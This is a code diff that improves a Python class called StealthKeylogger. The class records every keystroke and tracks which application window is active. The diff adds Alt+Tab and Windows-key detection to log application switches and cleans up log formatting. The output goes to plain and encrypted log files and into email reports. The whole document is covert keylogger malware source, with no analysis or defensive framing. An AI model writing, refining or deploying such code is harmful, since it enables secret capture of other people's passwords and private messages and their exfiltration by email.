@@ -59,6 +59,9 @@ class StealthKeylogger:
         self.current_app = ""
         self.last_window_check = 0
         
+        # Alt key tracking for better window detection
+        self._alt_pressed = False
+        
         # Running flag
         self.running = True
         
@@ -286,8 +289,8 @@ class StealthKeylogger:
             return
         
         current_time = time.time()
-        # Only check window every 2 seconds to reduce overhead
-        if current_time - self.last_window_check < 2:
+        # Check window more frequently (every 0.5 seconds) for better detection
+        if current_time - self.last_window_check < 0.5:
             return
         
         self.last_window_check = current_time
@@ -305,58 +308,76 @@ class StealthKeylogger:
                 else:
                     new_context = app_name
             
-            # If context changed, log it
-            if new_context and new_context != self.current_window:
+            # Update current window context (will be logged when buffer flushes)
+            if new_context and new_context != getattr(self, 'current_window', ''):
                 self.current_window = new_context
                 self.current_app = app_name
-                
-                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-                context_log = f"[{timestamp}] === Application: {new_context} ===\n"
-                
-                with self.buffer_lock:
-                    self.keystroke_buffer.append(context_log)
                     
         except Exception as e:
             self.logger.error(f"Error updating window context: {e}")
     
     def format_keystroke(self, key):
-        """Format keystroke for logging"""
-        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S') if self.config.get('keylogger', {}).get('log_timestamps', True) else ""
-        
+        """Format keystroke for logging with clean, readable output"""
         try:
-            # Handle special keys
+            # Handle special keys that should be logged but not clutter output
             if key == Key.space:
-                return f"[{timestamp}] [SPACE]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else " "
+                return " "  # Just return a space
             elif key == Key.enter:
-                return f"[{timestamp}] [ENTER]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else "\n"
+                return "\n"  # Just return a newline
             elif key == Key.backspace:
-                return f"[{timestamp}] [BACKSPACE]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else "[BS]"
+                return "[BACKSPACE]"
             elif key == Key.tab:
-                return f"[{timestamp}] [TAB]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else "\t"
+                return "[TAB]"
             elif key == Key.shift or key == Key.shift_l or key == Key.shift_r:
-                return f"[{timestamp}] [SHIFT]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else ""
+                return ""  # Don't log shift keys - they're modifier keys
             elif key == Key.ctrl_l or key == Key.ctrl_r:
-                return f"[{timestamp}] [CTRL]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else ""
+                return "[CTRL]"
             elif key == Key.alt_l or key == Key.alt_r:
-                return f"[{timestamp}] [ALT]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else ""
+                return "[ALT]"
             elif hasattr(key, 'char') and key.char is not None:
-                # Regular character
-                prefix = f"[{timestamp}] " if self.config.get('keylogger', {}).get('log_timestamps', True) else ""
-                return f"{prefix}{key.char}"
+                # Regular character - just return it
+                return key.char
             else:
                 # Other special keys
                 key_name = str(key).replace('Key.', '').upper()
-                return f"[{timestamp}] [{key_name}]\n" if self.config.get('keylogger', {}).get('log_special_keys', True) else f"[{key_name}]"
+                return f"[{key_name}]"
                 
         except Exception as e:
             self.logger.error(f"Error formatting keystroke: {e}")
-            return f"[{timestamp}] [ERROR]\n"
+            return "[ERROR]"
     
     def on_key_press(self, key):
         """Handle key press events"""
         try:
-            # Update window context before logging keystroke
-            self.update_window_context()
+            # Check for window switching indicators and force immediate window update
+            force_window_check = False
+            
+            if key == Key.alt_l or key == Key.alt_r:
+                self._alt_pressed = True
+                force_window_check = True
+            elif key == Key.tab and hasattr(self, '_alt_pressed') and self._alt_pressed:
+                # Alt+Tab detected - force immediate window check
+                force_window_check = True
+            elif key == Key.cmd or key == Key.cmd_l or key == Key.cmd_r:
+                # Command key (Mac) - force window check
+                force_window_check = True
+            elif hasattr(key, 'vk') and key.vk in [91, 92]:  # Windows key
+                force_window_check = True
+            else:
+                # Reset Alt state if other keys pressed
+                if key != Key.tab:
+                    self._alt_pressed = False
+            
+            if force_window_check:
+                # Force immediate window context update
+                self.last_window_check = 0
+                self.update_window_context()
+                # Also flush buffer to capture application switch
+                if self.keystroke_buffer:
+                    self.flush_buffer()
+            else:
+                # Regular window context update
+                self.update_window_context()
             
             formatted_key = self.format_keystroke(key)
             
@@ -371,21 +392,51 @@ class StealthKeylogger:
             self.logger.error(f"Error in key press handler: {e}")
     
     def flush_buffer(self):
-        """Flush keystroke buffer to file"""
+        """Flush keystroke buffer to file with clean, readable formatting"""
         if not self.keystroke_buffer:
             self.logger.info("Buffer flush called but no keystrokes in buffer")
             return
-        
+
         try:
-            # Store count before clearing buffer
+            # Store count before processing
             keystroke_count = len(self.keystroke_buffer)
             
-            # Write to plain text log
-            with open(self.config['log_file'], 'a', encoding='utf-8') as f:
-                f.writelines(self.keystroke_buffer)
+            # Join all keystrokes and clean them up
+            raw_text = ''.join(self.keystroke_buffer)
             
-            # Write to encrypted log
-            encrypted_content = self.encrypt_data(''.join(self.keystroke_buffer))
+            # Clean the text by removing extra spaces and fixing special keys
+            clean_text = raw_text.replace(' [CTRL] ', ' [CTRL]')
+            clean_text = clean_text.replace(' [ALT] ', ' [ALT]')
+            clean_text = clean_text.replace(' [BACKSPACE] ', ' [BACKSPACE]')
+            clean_text = clean_text.replace(' [TAB] ', ' [TAB]')
+            
+            # Remove multiple consecutive spaces
+            import re
+            clean_text = re.sub(r' +', ' ', clean_text)
+            
+            # Get timestamp
+            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            short_time = datetime.now().strftime('%H:%M:%S')
+            
+            # Create the log entry
+            log_entry = ""
+            
+            # Add window context header only if window changed
+            if hasattr(self, 'current_window') and self.current_window:
+                if not hasattr(self, 'last_logged_window') or self.last_logged_window != self.current_window:
+                    log_entry += f"\n🔄 [{timestamp}] Application: {self.current_window}\n"
+                    log_entry += "─" * 60 + "\n"
+                    self.last_logged_window = self.current_window
+            
+            # Add clean keystroke text with single timestamp
+            if clean_text.strip():
+                log_entry += f"[{short_time}] {clean_text.strip()}\n"
+            
+            # Write to files
+            with open(self.config['log_file'], 'a', encoding='utf-8') as f:
+                f.write(log_entry)
+            
+            encrypted_content = self.encrypt_data(log_entry)
             with open(self.config['encrypted_log_file'], 'a', encoding='utf-8') as f:
                 f.write(encrypted_content + '\n')
             
@@ -398,120 +449,46 @@ class StealthKeylogger:
             self.logger.error(f"Error flushing buffer: {e}")
     
     def format_log_for_email(self, log_content):
-        """Format log content for better readability in emails"""
+        """Format log content for clean, readable emails"""
         if not log_content.strip():
             return "No keystrokes captured."
         
-        import re
-        from datetime import datetime, timedelta
-        
-        # Split content into lines for better processing
         lines = log_content.split('\n')
-        formatted_lines = []
-        current_keystroke_line = ""
-        current_time = ""
-        last_timestamp = None
+        formatted_output = []
+        current_section = ""
         
         for line in lines:
             line = line.strip()
             if not line:
                 continue
             
-            # Check if this is an application context line
-            if '=== Application:' in line:
-                # Finish any current keystroke line before adding app context
-                if current_keystroke_line.strip():
-                    formatted_lines.append(f"[{current_time}] {current_keystroke_line.strip()}")
-                    current_keystroke_line = ""
+            # Handle application context lines
+            if line.startswith('🔄') and 'Application:' in line:
+                # Add previous section if exists
+                if current_section:
+                    formatted_output.append(current_section)
+                    current_section = ""
                 
-                # Extract timestamp and app info
-                timestamp_match = re.search(r'\[([^\]]+)\]', line)
-                app_match = re.search(r'=== Application: ([^=]+) ===', line)
-                
-                if timestamp_match and app_match:
-                    timestamp = timestamp_match.group(1)
-                    app_info = app_match.group(1).strip()
-                    formatted_lines.append("")  # Add spacing
-                    formatted_lines.append(f"🔄 [{timestamp}] Application: {app_info}")
-                    formatted_lines.append("─" * 50)
-                    current_time = timestamp.split(' ')[1] if ' ' in timestamp else timestamp
+                # Clean up the application line
+                formatted_output.append("")  # Add spacing
+                formatted_output.append(line)
+                formatted_output.append("─" * 60)
                 continue
             
-            # Parse regular keystroke entries
-            pattern = r'\[([^\]]+)\]\s*([^\[]*|\[[^\]]+\])'
-            matches = re.findall(pattern, line)
+            # Skip separator lines
+            if line.startswith('─'):
+                continue
             
-            for timestamp, key_content in matches:
-                # Parse timestamp
-                try:
-                    current_dt = datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S')
-                    time_only = timestamp.split(' ')[1]
-                except:
-                    time_only = timestamp
-                    current_dt = None
-                
-                # Clean up key content
-                key = key_content.strip()
-                
-                # Check if there's a significant time gap (more than 10 seconds)
-                show_timestamp = False
-                if last_timestamp is None:
-                    show_timestamp = True
-                    current_time = time_only
-                elif current_dt and last_timestamp:
-                    time_gap = (current_dt - last_timestamp).total_seconds()
-                    if time_gap > 10:  # 10 seconds gap
-                        show_timestamp = True
-                
-                # If showing timestamp, finish current line and start new one
-                if show_timestamp and current_keystroke_line.strip():
-                    formatted_lines.append(f"[{current_time}] {current_keystroke_line.strip()}")
-                    current_keystroke_line = ""
-                    current_time = time_only
-                elif not current_time:
-                    current_time = time_only
-                
-                # Handle different key types
-                if key == '[SPACE]':
-                    current_keystroke_line += " "
-                elif key == '[ENTER]':
-                    if current_keystroke_line.strip():
-                        formatted_lines.append(f"[{current_time}] {current_keystroke_line.strip()}")
-                    formatted_lines.append("--- <ENTER> ---")
-                    current_keystroke_line = ""
-                    current_time = ""
-                elif key == '[TAB]':
-                    current_keystroke_line += " <TAB> "
-                elif key == '[BACKSPACE]':
-                    if current_keystroke_line and current_keystroke_line[-1] != ' ':
-                        current_keystroke_line = current_keystroke_line[:-1]
-                    else:
-                        current_keystroke_line += " <BACKSPACE> "
-                elif key in ['[CTRL]', '[ALT]', '[SHIFT]']:
-                    current_keystroke_line += f" <{key[1:-1]}> "
-                elif key.startswith('[') and key.endswith(']'):
-                    # Other special keys
-                    current_keystroke_line += f" <{key[1:-1]}> "
-                elif key:
-                    # Regular character
-                    current_keystroke_line += key
-                
-                # Start new line after reasonable length
-                if len(current_keystroke_line) > 100:
-                    if current_keystroke_line.strip():
-                        formatted_lines.append(f"[{current_time}] {current_keystroke_line.strip()}")
-                    current_keystroke_line = ""
-                    current_time = ""
-                
-                # Update last timestamp for gap detection
-                if current_dt:
-                    last_timestamp = current_dt
+            # Handle keystroke lines with timestamps
+            if line.startswith('[') and '] ' in line:
+                # This is a timestamped keystroke line - add it as-is
+                formatted_output.append(line)
+            else:
+                # Other content
+                if line:
+                    formatted_output.append(line)
         
-        # Add any remaining content
-        if current_keystroke_line.strip():
-            formatted_lines.append(f"[{current_time}] {current_keystroke_line.strip()}")
-        
-        return '\n'.join(formatted_lines) if formatted_lines else "No readable keystrokes found."
+        return '\n'.join(formatted_output) if formatted_output else "No readable keystrokes found."
     
     def send_email_report(self):
         """Send email report with logs"""
